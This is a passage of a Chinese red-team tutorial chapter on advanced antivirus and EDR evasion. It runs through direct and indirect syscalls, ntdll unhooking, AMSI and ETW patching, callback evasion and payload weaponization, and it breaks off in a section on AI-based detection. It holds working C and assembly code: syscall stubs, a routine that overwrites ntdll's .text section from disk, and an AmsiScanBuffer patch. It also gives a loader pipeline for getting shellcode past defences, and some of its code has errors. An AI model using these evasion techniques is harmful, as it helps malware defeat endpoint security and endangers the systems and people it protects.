---
outline: deep
---

# 第64章 免杀技术（高级篇）

> **难度等级：🔴 特等级**
>
> **预计学习时间：240分钟**
>
> **本章看点：直接系统调用、间接系统调用、Unhooking、AMSI绕过、ETW绕过、EDR对抗、回调绕过、AI免杀、5个实战案例、20道习题**

::: tip 说明
上一章我们学习了进阶免杀技术，
包括Shellcode加密、分离免杀、
进程注入、无文件攻击等。

这一章我们来学习
**真正的高级免杀技术**——
直接对抗EDR的核心手段。

为什么叫"高级"？
因为这些技术
不是简单的加壳加密，
而是从**从根本上
绕过EDR的检测机制。

内容包括：
- 直接系统调用（Direct Syscall）
- 间接系统调用（Indirect Syscall）
- Unhooking技术（脱钩）
- AMSI绕过技术
- ETW绕过技术
- 回调函数绕过
- EDR对抗技术体系
- 免杀武器化思路
- AI时代的免杀新趋势

准备好了吗？
进入免杀的深水区！
:::

---

## 💡 核心原理：高级免杀——怎么骗过"无处不在的眼睛"

> 高级免杀对抗的是EDR（端点检测与响应），它是杀软的升级版，比传统杀软"聪明"得多。

### 一个比喻贯穿全章：你在一个布满监控的大楼里

把Windows系统想象成一座写字楼：

| EDR机制 | 写字楼类比 | 它能看到什么 |
|---------|-----------|-------------|
| **用户态Hook (ntdll.dll)** | 每扇门前都装了摄像头 | 谁进了哪个房间 |
| **内核回调** | 大楼管理处的监控室 | 所有人的进出记录 |
| **AMSI** | 邮件室的扫描仪 | 所有PowerShell脚本内容 |
| **ETW** | 大楼日志系统 | 所有事件的时间记录 |
| **内存扫描** | 随机查房 | 房间里有没有违禁品 |

### 本章四大武器（全部对应"躲监控"的生活策略）

| 技术 | 相当于... | 核心原理 |
|------|----------|----------|
| **Direct Syscall** | 不走正门，走消防通道 | 绕过Hook，直接调内核 |
| **Unhooking** | 用布把摄像头蒙住 | 恢复ntdll.dll的原始代码 |
| **AMSI 绕过** | 用隐形墨水写信 | 让脚本内容绕过扫描 |
| **ETW 绕过** | 删掉监控录像 | 阻止日志记录 |

### 核心公式

```
EDR = Hook + 行为分析 + 内存扫描 + 日志

绕过的本质 = 让Hook失效 + 让行为看起来正常 + 让内存查不到 + 让日志没有记录
```

---

## 📖 本章概述

::: tip 写在前面
学到这里，
你可能会发现一个规律：
免杀技术的发展，
其实就是
**攻击方和防御方的军备竞赛**
不断升级的过程。**

**杀软时代：**
- 防御：特征码扫描
- 攻击：加壳、加密、花指令

**EDR时代：**
- 防御：钩子（用户态Hook、行为检测、内存扫描
- 攻击：直接系统调用、Unhooking、间接调用

**未来：**
- 防御：AI/ML检测、内核态检测
- 攻击：AI生成免杀、对抗样本

这一章我们讲的是
EDR对抗的核心技术，
也是红队必备技能。

这些技术原理不复杂，
但理解起来需要一些
操作系统底层知识。

没关系，
我们一步一步来，
用通俗易懂的方式讲明白。
:::

---

## 🎯 学习目标

读完本章，你将能够：

- [x] 理解系统调用的原理和过程
- [x] 掌握直接系统调用（Direct Syscall）原理和实现
- [x] 掌握间接系统调用（Indirect Syscall）原理和实现
- [x] 理解EDR用户态Hook原理
- [x] 掌握Unhooking（脱钩）技术
- [x] 掌握AMSI绕过的多种方法
- [x] 掌握ETW绕过技术
- [x] 理解回调函数绕过
- [x] 了解EDR对抗技术体系
- [x] 了解AI时代的免杀新趋势
- [x] 为后续高级红队打下坚实基础

---

## 🔍 系统调用基础

> **基础类比：EDR的Hook就像窃听器**
> 
> EDR在ntdll.dll里安插"窃听器"(Hook)，你调用任何Windows API，EDR都能听到。
> 比如你调用`CreateRemoteThread`来注入进程，EDR立刻就知道：有人在干坏事！
> 
> **Direct Syscall的做法**：不经过被窃听的电话线，直接用一根私密电话线(直接syscall指令)打给内核。
> EDR的窃听器根本听不到这通电话。
>
> ```
> 正常调用（被Hook监听）：
> 你的程序 → ntdll.dll（有Hook窃听器）→ syscall → 内核
>            ↑ EDR在这里偷听！
>
> Direct Syscall（Hook失效）：
> 你的程序 → 直接执行syscall → 内核
>            ↑ EDR的窃听器根本不在这条线上！
> ```

### 1.1 什么是系统调用？

**系统调用（System Call）
是用户态程序
向操作系统内核
请求服务的方式。

说人话：
**你想让操作系统帮你干活，
就得通过系统调用。

**举个例子：**
你想打开一个文件，
你的程序不能直接去读硬盘，
得调用CreateFile，
CreateFile内部会调用系统调用，
让内核去帮你打开文件。

**为什么要有系统调用？**

```
用户态（Ring 权限低）
  ↓ 系统调用
内核态（Ring 0 权限高）
```

- 用户态程序权限低，不能直接操作硬件
- 内核态权限高，可以操作一切
- 系统调用是用户态进入内核态的桥梁

### 1.2 Windows系统调用过程

Windows系统调用的过程：

```
你的程序
  ↓ 调用
kernel32.dll / ntdll.dll
  ↓ 调用
syscall / sysenter 指令
  ↓ 进入
内核（ntoskrnl.exe
  ↓ 执行
系统服务
```

**详细步骤：**

1. **应用层**：你的代码调用 `CreateRemoteThread`（kernel32.dll）
2. **转发**：kernel32.dll 调用 ntdll.dll 中的 `NtCreateThreadEx`
3. **系统调用号**：ntdll.dll 把系统调用号放到 eax 寄存器
4. **进入内核**：执行 `syscall` 指令（x64）或 `sysenter`（x86）
5. **内核执行**：内核根据调用号找到对应的内核函数执行
6. **返回**：执行结果返回用户态

**关键点：
**所有的Windows API最终都会走到ntdll.dll里的Native API，
然后通过syscall进入内核。

### 1.3 系统调用号

每个系统调用都有一个编号，叫系统调用号（SSDT）。

**x64下：
- 系统调用号放在 `eax` 寄存器
- 参数放在 `rcx, rdx, r8, r9, ...`
- 执行 `syscall` 指令进入内核

**x86下：
- 系统调用号放在 `eax` 寄存器
- 参数放在栈上
- 执行 `sysenter` 指令进入内核

**注意：**
系统调用号在不同Windows版本中可能不一样！
Windows 10和Windows 11的调用号就有差异。

### 1.4 为什么EDR要Hook？

EDR怎么检测恶意行为？

**方法：Hook ntdll.dll里的函数！**

比如：
- EDR在 `NtCreateThreadEx` 开头放个钩子
- 你一调用这个函数，EDR就知道了
- EDR检查参数，发现是远程线程注入，就报警

**Hook的原理：**

```
正常调用：
你的代码 → NtCreateThreadEx(ntdll) → syscall → 内核

被Hook后：
你的代码 → [EDR的Hook函数] → NtCreateThreadEx → syscall → 内核
                        ↓
                   检查行为、记录、报警
```

EDR通过Hook，
就能监控所有敏感操作。

那怎么绕过呢？
方法1：**直接系统调用** — 绕过ntdll，自己直接发syscall
方法2：**Unhooking** — 把EDR的钩子去掉
方法3：**间接系统调用** — 找个没被Hook的地方发syscall

下面我们一个一个讲。

---

## ⚡ 直接系统调用（Direct Syscall）

### 2.1 原理

**直接系统调用**，
就是不通过ntdll.dll，
自己直接执行syscall指令进入内核。

```
正常路径：
你的代码 → ntdll.NtCreateThreadEx → syscall → 内核

直接系统调用：
你的代码 → 自己写的syscall → 内核
```

**为什么能绕过EDR？**

因为EDR的钩子在ntdll.dll的函数开头，
你不调用那些函数，
直接自己发syscall，
钩子就碰不到你了！

**优点：
- 完全绕过用户态Hook
- 隐蔽性强

**缺点：
- 需要自己找系统调用号
- 不同Windows版本调用号不一样
- 需要自己处理参数
- 容易被检测到"可疑的syscall指令

### 2.2 系统调用号怎么找？

**方法1：从ntdll.dll里读**

ntdll.dll里每个Native API的结构是这样的：

```asm
NtCreateThreadEx:
  mov r10, rcx
  mov eax, 0xB5  ; 系统调用号
  syscall
  ret
```

所以系统调用号就在函数的第4个字节（x64下）。

**C语言读取系统调用号的代码：

```c
#include <windows.h>
#include <stdio.h>

DWORD GetSyscallNumber(LPCSTR funcName) {
    // 加载ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // 获取函数地址
    FARPROC funcAddr = GetProcAddress(hNtdll, funcName);
    
    // 读取系统调用号（x64下在第4个字节
    // mov r10, rcx  ; 2字节
    // mov eax, xx  ; 5字节（第2个字节开始是操作码，第3-6字节是值）
    
    BYTE* pFunc = (BYTE*)funcAddr;
    
    // 查找 mov eax, syscall_number 的模式
    // 字节模式: 4C 8B D1 (mov r10, rcx)
    //         B8 xx xx xx xx (mov eax, number)
    
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        DWORD syscallNumber = *(DWORD*)(pFunc + 4);
        return syscallNumber;
    }
    
    return 0;
}

int main() {
    DWORD number = GetSyscallNumber("NtCreateThreadEx");
    printf("NtCreateThreadEx syscall number: 0x%X\n", number);
    return 0;
}
```

**方法2：硬编码**

直接把系统调用号写死在代码里。
但缺点是不同Windows版本号不一样，
需要判断版本。

**方法3：用工具生成**

比如SysWhispers2、Hell's Gate等工具可以自动生成系统调用代码。

### 2.3 手写直接系统调用实现

下面我们来写一个最简单的直接系统调用例子。

**x64汇编实现NtAllocateVirtualMemory的直接调用：

```c
// 定义函数指针
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// 直接系统调用的汇编实现
// 我们用C语言内嵌汇编
```

**注意：**
x64下直接系统调用的汇编模板：

```asm
; x64 syscall 调用约定：
; 参数顺序：rcx, rdx, r8, r9, 栈
; 系统调用号放 eax
; 执行 syscall
```

**完整的C语言实现（使用内联汇编或独立汇编）：

```c
// 注意：x64的Visual Studio不支持内联汇编，
// 需要用.asm文件或者用其他方式实现
```

**用C语言 + MASM实现：**

创建一个asm文件：
```asm
; syscalls.asm
.code

NtAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h   ; 系统调用号（示例，不同版本不一样
    syscall
    ret
NtAllocateVirtualMemory endp

NtCreateThreadEx proc
    mov r10, rcx
    mov eax, 0C1h   ; 系统调用号
    syscall
    ret
NtCreateThreadEx endp

end
```

然后在C代码中声明：
```c
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PULONG RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

EXTERN_C NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);
```

### 2.4 直接系统调用的检测

直接系统调用也不是完全检测不到。

**EDR怎么检测直接系统调用？**

1. **检测syscall指令的来源**：
   - 正常syscall应该从ntdll.dll里发出
   - 如果从你的代码里直接执行syscall，就可疑

2. **内核回调**：
   - EDR在内核里也有回调
   - 系统调用进入内核后，EDR在内核层也能检测

3. **栈回溯**：
   - 检查调用栈，发现返回地址不在ntdll里

### 2.5 直接系统调用工具

**常用工具：**
- **SysWhispers2**：自动生成直接系统调用的头文件
- **Hell's Gate**：运行时动态解析系统调用号
- **Halo's Gate**：Hell's Gate的改进版
- **Tartarus Gate**：更高级的系统调用技术

**SysWhispers2 使用示例：
```bash
# 生成syscalls.h和syscalls.c
python3 syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx,NtWriteVirtualMemory -o syscalls
```

生成的代码可以直接用在你的项目里。

---

## 🔄 间接系统调用（Indirect Syscall）

### 3.1 原理

**间接系统调用**，
也叫 **Indirect Syscall，
是直接系统调用的改进版。

**问题：**
直接系统调用有个问题——
syscall指令在你自己的代码里，
EDR检查返回地址的时候，
发现返回地址不在ntdll.dll里，
就会怀疑。

**解决：**
间接系统调用的思路是：
**让syscall指令从ntdll.dll里发出，
但跳到syscall之前，
我们先改eax寄存器的值。**

```
间接系统调用流程：
1. 找到ntdll.dll里某个syscall指令的地址
2. 把我们自己设置好参数和调用号
3. 跳到ntdll里的syscall指令
4. 执行完返回

这样返回地址在ntdll里
```

说人话：
**借ntdll的"壳"发syscall，
让它看起来像是ntdll发的。

### 3.2 实现思路

**步骤：**

1. 在ntdll.dll里找一个syscall指令的地址
2. 把系统调用号放到eax
3. 跳转到那个syscall指令
4. 执行syscall进入内核

**为什么叫"间接"？
因为不是直接在你代码里的syscall，
而是跳转到ntdll里的syscall。

### 3.3 代码实现

```c
#include <windows.h>
#include <stdio.h>

// 找到ntdll中找syscall指令的地址
FARPROC FindSyscallInstruction() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pNtdll = (BYTE*)hNtdll;
    
    // 遍历ntdll的代码段找syscall指令
    // syscall指令的字节码: 0x0F 0x05
    // 后面跟着c3 (ret)
    
    // 简单方法：找一个随便一个Nt函数里的syscall
    // 比如NtQueryInformationProcess里的
    
    FARPROC pFunc = GetProcAddress(hNtdll, "NtQueryInformationProcess");
    
    BYTE* p = (BYTE*)pFunc;
    
    // 在函数里找syscall指令
    for (int i = 0; i < 100; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) {
            return (FARPROC)(p + i);
        }
    }
    
    return NULL;
}

// 间接系统调用的函数
// 我们用汇编来实现参数传递
```

**更完整的实现（x64汇编：**

```asm
; indirect_syscall.asm
.code

; 间接系统调用
; rcx = 系统调用号
; rdx = 参数地址（参数的参数...）
; 实际上x64调用约定比较麻烦，
; 因为参数要按顺序：rcx, rdx, r8, r9, 栈
; 我们需要重新排列参数

IndirectSyscall proc
    ; 保存原始参数
    push rbp
    mov rbp, rsp
    
    ; 系统调用号在 rcx
    mov eax, ecx
    
    ; 其他参数需要重新排列
    ; 原始：rcx=number, rdx=arg1, r8=arg2, r9=arg3
    ; 需要：rcx=arg1, rdx=arg2, r8=arg3, r9=arg4
    ; 栈上还有更多参数
    
    mov r10, rdx    ; arg1 -> r10 (第一个参数移到r10
    mov rdx, r8      ; arg2 -> rdx
    mov r8, r9       ; arg3 -> r8
    mov r9, [rbp+48] ; arg4 -> r9
    
    ; 更多栈参数...
    
    ; 跳到syscall指令地址存在某个地址
    jmp qword ptr [syscall_addr]
    
IndirectSyscall endp

end
```

**注意：**
间接系统调用的参数排列比较麻烦，
实际使用现成的工具更方便。

### 3.4 间接系统调用的优势

| 特性 | 直接系统调用 | 间接系统调用 |
|------|-------------|-------------|
| 绕过用户态Hook | ✅ | ✅ |
| 返回地址在ntdll | ❌ | ✅ |
| 检测难度 | 中等 | 更高 |
| 实现难度 | 简单 | 复杂 |

间接系统调用更难检测，
因为栈回溯看到返回地址在ntdll.dll里，
看起来像是正常的系统调用。

---

## 🪝 Unhooking技术

> **生活类比：把被换了的锁芯换回去**
>
> EDR的Hook就像有人偷偷把你家的大门锁芯换了——你用钥匙开门，实际上打开了另一道暗门（EDR的监控代码）。你每开一次门，都有人偷偷记录了。
>
> Unhooking就是：**把锁芯换回原来那个。** 从没有被篡改过的源文件（磁盘上的ntdll.dll）取出原始代码，覆盖掉EDR改过的代码。换完之后，你再用钥匙开门，就走的是原来的门了，EDR再也看不到。
>
> ```
> Unhooking前：ntdll!NtCreateThread → [EDR的跳转] → EDR监控代码 → 原始代码
> Unhooking后：ntdll!NtCreateThread → 原始代码（直接执行，EDR看不到）
> ```
>
> **关键问题：为什么不直接在程序里写syscall指令？** 
> 因为Unhooking是让你恢复整个ntdll.dll的所有函数，恢复后你可以正常调用所有API，用起来和写正常程序一样方便。而Direct Syscall每个函数都要自己写汇编，很麻烦。

### 4.1 什么是Unhooking？

**Unhooking**，
中文叫"脱钩"或"去钩子"，
就是把EDR放的钩子去掉，
恢复函数原来的样子。

```
被Hook的函数：
函数开头 → EDR的跳转指令 → 跳到EDR的代码

Unhook后：
函数开头 → 原来的正常代码 → 正常执行
```

**为什么要Unhook？
因为很多EDR会Hook了关键函数，
Unhook之后，
这些函数就恢复正常了，
EDR就监控不到了。

### 4.2 Hook的常见类型

**常见的Hook方式：**

1. **Inline Hook（内联钩子）**
   - 在函数开头改几个字节，改成跳转指令
   - 最常见的Hook方式

2. **IAT Hook（导入表钩子）**
   - 修改PE导入表的函数地址
   - 改成Hook函数

3. **EAT Hook（导出表钩子）**
   - 修改导出表

**Inline Hook最常见，
我们重点讲这个。

### 4.3 Inline Hook原理

EDR的Inline Hook通常是这样的：

**正常函数开头：**
```asm
mov r10, rcx
mov eax, 0x18
syscall
ret
```

**被Hook后：**
```asm
jmp 0xEDR_HOOK_ADDRESS   ; 5字节跳转
mov eax, 0x18        ; 剩下的字节
syscall
ret
```

EDR把函数开头的5个字节改成了一个jmp指令，
一跳就跳到EDR自己的代码。

**Unhook就是把这5个字节改回来。**

### 4.4 Unhooking方法

**方法1：从磁盘重新加载ntdll.dll**

思路：
1. 从磁盘读取ntdll.dll的.text段
2. 覆盖内存中的ntdll.dll的.text段
3. 这样钩子就没了

```c
#include <windows.h>
#include <stdio.h>

BOOL UnhookNtdll() {
    // 1. 读取磁盘上的ntdll.dll
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    // 2. 创建文件映射
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return FALSE; }
    
    // 3. 映射到内存
    LPVOID pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pMap) { CloseHandle(hMap); CloseHandle(hFile); return FALSE; }
    
    // 4. 找到.text段
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMap;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pMap + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    
    LPVOID pText = NULL;
    DWORD sizeOfText = 0;
    
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            pText = (LPVOID)((BYTE*)pMap + pSec[i].VirtualAddress);
            sizeOfText = pSec[i].Misc.VirtualSize;
            break;
        }
    }
    
    if (!pText) return FALSE;
    
    // 5. 获取当前进程的ntdll.dll地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID pCurrentText = (LPVOID)((BYTE*)hNtdll + pSec[i].VirtualAddress);
    
    // 6. 修改内存保护，然后覆盖
    DWORD oldProtect;
    VirtualProtect(pCurrentText, sizeOfText, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    memcpy(pCurrentText, pText, sizeOfText);
    
    // 7. 恢复保护
    VirtualProtect(pCurrentText, sizeOfText, oldProtect, &oldProtect);
    
    // 8. 清理
    UnmapViewOfFile(pMap);
    CloseHandle(hMap);
    CloseHandle(hFile);
    
    return TRUE;
}
```

**方法2：从已知DLL的.text段复制**

和上面类似，
就是把磁盘上的干净代码
覆盖到内存里。

**方法3：单个函数Unhook**

只Unhook特定的函数，
不全部Unhook。
这样更隐蔽。

```c
BOOL UnhookFunction(LPCSTR moduleName, LPCSTR funcName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    FARPROC pFunc = GetProcAddress(hModule, funcName);
    
    // 从磁盘读取原始字节
    // ... （类似上面的方法，找到函数原始字节
    // 然后写回去
    
    return TRUE;
}
```

### 4.5 Unhooking检测

EDR也会检测Unhooking。

**检测方法：**

1. **周期性检查**：EDR定期检查函数开头字节
2. **硬件断点**：EDR用硬件断点监控函数
3. **内核回调**：就算用户态Unhook了，内核还有
4. **对比检查**：对比内存中的代码和磁盘是否一致

### 4.6 高级Unhooking技术

**更高级的Unhooking：**

- **Perun's Fart**：通过异常处理Unhook
- **Vegile**：通过VEH异常处理Unhook
- **DLL空转：** 直接加载一个干净的ntdll副本

这些技术更复杂，也更难检测。

---

## 🛡️ AMSI绕过

> **生活类比：邮局的必检规则**
> 
> AMSI就像邮局的一个规定：所有寄出的信，必须先给检查员看一眼内容，没问题了才能寄出。
> (所有PowerShell/VBScript/宏脚本在运行前，必须先给杀软扫一眼)
> 
> 绕过AMSI就相当于：
> - **方法1**：给检查员下药让他睡着(Patch AMSI)
> - **方法2**：趁检查员换班的时候寄(混淆绕过)
> - **方法3**：把信封做得很奇怪，检查员不知道怎么开(格式破坏)
> - **方法4**：弄一个假的检查员替代真的(DLL劫持)

### 5.1 什么是AMSI？

**AMSI**（Antimalware Scan Interface）
是微软提供的一个接口，
让杀软可以扫描脚本和内存中的内容。

**AMSI的作用：
- PowerShell脚本执行前
- VBScript、JScript脚本
- Office VBA宏
- .NET程序
- 内存中的脚本内容

都会被送给杀软扫描。

**为什么要绕过AMSI？**
因为PowerShell等脚本类的攻击，
很多都是通过PowerShell执行的，
AMSI会扫描这些脚本，
发现恶意内容就会被拦了。

### 5.2 AMSI工作原理

```
PowerShell执行脚本
  ↓
调用 AmsiScanBuffer()
  ↓
杀软的AMSI Provider扫描
  ↓
返回结果：干净/恶意
  ↓
干净就执行，恶意就阻止
```

**关键点：
AMSI本身不扫描，
它只是个接口，
真正扫描的是杀软的AMSI Provider。

### 5.3 AMSI绕过方法

**方法1：Patch AMSI（内存补丁）**

思路：
修改amsi.dll里的AmsiScanBuffer函数，
让它永远返回"干净"。

```powershell
# PowerShell中的AMSI绕过
# 找到amsi.dll的AmsiScanBuffer函数
# 修改它的开头，直接返回

# 这是最经典的方法

# 注意：仅用于学习，请勿用于非法用途
```

**C语言实现：**

```c
#include <windows.h>
#include <stdio.h>

BOOL PatchAmsi() {
    // 加载amsi.dll
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE;
    
    // 获取AmsiScanBuffer函数地址
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;
    
    // 修改内存保护
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 10, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch：把函数改成直接返回
    // x86: ret 0x18 (栈上清理参数
    // x64: xor rax, rax; ret
    // 让AmsiScanBuffer返回0（AMSI_RESULT_CLEAN
    
    #ifdef _WIN64
    // x64: xor eax, eax; ret
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    #else
    // x86: mov eax, 0; ret 18h
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC2, 0x18, 0x00 };
    #endif
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // 恢复保护
    VirtualProtect(pAmsiScanBuffer, 10, oldProtect, &oldProtect);
    
    return TRUE;
}
```

**方法2：AMSI初始化失败**

思路：
在AMSI初始化之前执行代码，
或者让AMSI初始化失败。

PowerShell中：
```powershell
# 在PowerShell启动时
# 阻止AMSI初始化
# 比如通过反射等
```

**方法3：混淆和编码**

把脚本混淆编码，
让AMSI扫描不到特征。

比如：
- Base64编码
- 字符串拼接
- 变量名混淆
- ...

**方法4：内存中解密执行**

把加密的脚本在内存中解密，
然后执行。

### 5.4 AMSI绕过检测

**EDR怎么检测AMSI绕过？**

1. **监控amsi.dll的内存**：检查AmsiScanBuffer是否被修改
2. **检测内存属性**：检查amsi.dll的内存页属性是否可写
3. **行为检测**：检测打开amsi.dll并修改内存的行为
4. **ETW**：通过ETW监控

---

## 📡 ETW绕过

> **生活类比：监控室的录像机——删掉录像就没人知道你干了什么**
>
> ETW就像大楼里的监控录像系统。每个房间发生的每件事，都被录像机默默记录下来了。
> EDR就盯着这些录像看：谁进了哪个房间？谁打开了保险柜？
>
> 绕过ETW的思路很直接：
> - **搞坏录像机(Patch EtwEventWrite)**：在录像机上加一行代码"直接停止录像"
> - **拔掉录像机的电源(停止ETW追踪)**：直接关闭追踪会话
> - **走没有安装摄像头的地方(用不触发ETW的底层API)**：有些地方没装摄像头，比如直接syscall

### 6.1 什么是ETW？

**ETW**（Event Tracing for Windows）
是Windows的事件追踪机制。

说人话：
**Windows自带的日志系统。

**EDR用ETW干嘛？**
EDR订阅ETW事件，
监控系统各种事件，
比如：
- 进程创建
- 线程创建
- 模块加载
- 网络连接
- ...

### 6.2 ETW工作原理

```
系统发生事件
  ↓
ETW Provider 提供事件
  ↓
ETW Consumer 消费事件
  ↓
EDR 消费事件进行分析
```

**常见的ETW Provider：**
- Microsoft-Windows-Kernel-Process：进程/线程事件
- Microsoft-Windows-Kernel-File：文件事件
- Microsoft-Windows-Kernel-Network：网络事件

### 6.3 ETW绕过方法

**方法1：停止ETW追踪**

思路：
找到ETW的追踪会话，
停掉它。

```c
// 停止ETW追踪
// 需要管理员权限
```

**方法2：Patch EtwEventWrite**

思路：
和AMSI类似，
Patch ntdll里的EtwEventWrite函数，
让它不写事件。

```c
BOOL PatchEtw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Patch函数，让它直接返回
    // ...
}
```

**方法3：未导出函数**

用一些不会触发ETW的方法。

比如：
- 直接系统调用（有些可能不触发某些ETW事件
- 用更底层的方法

### 6.4 注意事项

ETW绕过需要管理员权限，
而且ETW有内核也有。
用户态能绕过用户态的ETW，
内核态的不行。

---

## 🎯 回调函数绕过

> **生活类比：门卫和监控录像的区别**
>
> 你走Direct Syscall避开了走廊的监控摄像头(Hook)，但大楼门口的门卫(内核回调)还是会问你：你是谁？去哪？干什么？
>
> 内核回调是EDR在系统最底层安插的"门卫"，不管你走什么路来的，进大门时都会被门卫登记。
>
> **绕过门卫的方法：**
> - **走后门**：有些老旧的API路径不触发回调（找未使用回调路径）
> - **变成VIP**：用更底层的调用方式，门卫"级别不够"看不到
> - **人多挤进去**：在正常操作中夹带私货，门卫查不过来

### 7.1 什么是回调？

**回调（Callback）**
是EDR在内核里注册的回调函数，
当特定事件发生时，
系统会调用这些回调。

**常见的回调：**

| 回调类型 | 说明 |
|----------|------|
| **进程创建回调** | 进程创建/退出时调用 |
| **线程创建回调** | 线程创建/退出时调用 |
| **模块加载回调** | DLL加载/卸载时调用 |
| **注册表回调** | 注册表操作时调用 |
| **对象回调** | 对象操作时调用 |

### 7.2 回调怎么检测

**进程创建回调：**
你创建一个远程线程，
内核的回调就会被调用，
EDR就知道了。

### 7.3 绕过方法

**方法1：直接系统调用**
前面讲的直接系统调用，
有些能绕过部分回调。

**方法2：找未使用回调的路径**
有些老的API可能不走回调。

**方法3：利用漏洞**
利用内核漏洞绕开回调。

**方法4：手动走不同的路径**
比如用不同的API实现同样的功能。

---

## 🛡️ EDR对抗技术体系

> **总结性类比：EDR是一座六层防御的堡垒，你需要攻破每一层**
>
> 把EDR想象成一座城堡，你的Payload是潜入者：
>
> | EDR防御层 | 城堡类比 | 你的对策 |
> |---------|---------|----------|
> | **静态检测** | 城门守卫对照通缉令验身份 | 易容术（加壳/混淆/加密） |
> | **用户态Hook** | 走廊里的窃听器/探针 | 走密道（Direct Syscall）或破坏窃听器（Unhooking） |
> | **AMSI** | 城门口的安检扫描仪 | 弄坏扫描仪（Patch AMSI）或用绝缘材料（混淆） |
> | **ETW** | 全城监控录像 | 关闭录像机（Patch ETW） |
> | **内核回调** | 城墙上每座塔楼的哨兵 | 趁哨兵换岗时溜过去 |
> | **行为分析** | 巡逻队分析你的行动轨迹 | 混在人群中，行为正常 |
>
> **核心战术思想：对付EDR不能只用一招，要用组合拳。** 就像潜入城堡：你既要易容、又要走密道、还要关监控、最后趁哨兵不注意溜进去。任何一个环节失误，就失败了。

### 8.1 EDR检测手段总结

我们来总结一下EDR的检测手段：

| 检测层级 | 检测方式 | 绕过方法 |
|---------|---------|---------|
| **静态检测** | 特征码、哈希、签名 | 加壳、加密、混淆 |
| **用户态Hook** | Inline Hook、IAT Hook | 直接系统调用、Unhooking |
| **行为检测** | 行为规则、模式匹配 | 模拟正常行为、分散操作 |
| **内存扫描** | 扫描内存中的Shellcode | 加密、分段执行、Sleep掩盖 |
| **ETW** | 事件追踪 | Patch ETW、停止追踪 |
| **内核回调** | 进程/线程/模块回调 | 直接系统调用、未导出函数 |
| **AMSI** | 脚本扫描 | Patch AMSI、混淆 |

### 8.2 红队免杀思路

**红队免杀的核心思路：**

1. **减少可疑行为**
   - 越少调用敏感API
   - 越少用常见工具特征越少

2. **模拟正常行为**
   - 看起来像正常软件
   - 有正常的功能
   - 有数字签名最好

3. **降低熵值**
   - 不要全是加密数据
   - 混入正常代码

4. **分阶段执行**
   - 不要一次性全是Shellcode
   - 分段加载
   - 慢慢解密执行

5. **清理痕迹**
   - 执行完清理
   - 恢复钩子恢复

### 8.3 免杀武器化

**什么是免杀武器化？**
就是把你的Payload
变成一个能过杀软的武器。

**武器化流程：**

```
原始Payload
  ↓
Shellcode生成
  ↓
加密/编码
  ↓
加载器包装
  ↓
加壳/混淆
  ↓
测试
  ↓
调整
  ↓
成品
```

**加载器的核心功能：**
- Shellcode加密存储
- 运行时解密
- 内存分配
- 执行
- 反调试
- 反沙箱
- 字符串加密
- 间接系统调用/Unhooking

---

## 🤖 AI时代的免杀

> **比喻：狗鼻子 vs 教狗认新味道**
>
> 传统杀软像照片比对（精确但死板），AI杀软像警犬——它不知道具体的坏人长什么样，但它闻过的坏人味道太多了，一闻就知道这是不是坏人。
>
> **绕过AI的思路就更微妙了：**
> 你没法像改特征码那样改AI模型——AI不是查照片，它在"感受"你的气息。所以你要：
> - 让你的代码"闻起来"像正常软件（混入大量正常代码）
> - 给狗鼻子喷香水干扰嗅觉（加噪声/垃圾代码干扰AI判断）
> - 训练另一只狗专门骗原来的狗（对抗样本攻击AI模型）
>
> **AI对抗的本质**：不是修改规则，而是欺骗一个"会自己学习的判断者"。

### 9.1 AI检测

现在越来越多的杀软
开始用AI/机器学习
来检测恶意软件。

**AI检测的特点：**
- 不依赖特征码
- 学习正常和恶意的模式
- 能检测未知威胁
- 准确率越来越高

**AI检测的维度：
- 静态特征：字节序列、导入表、字符串
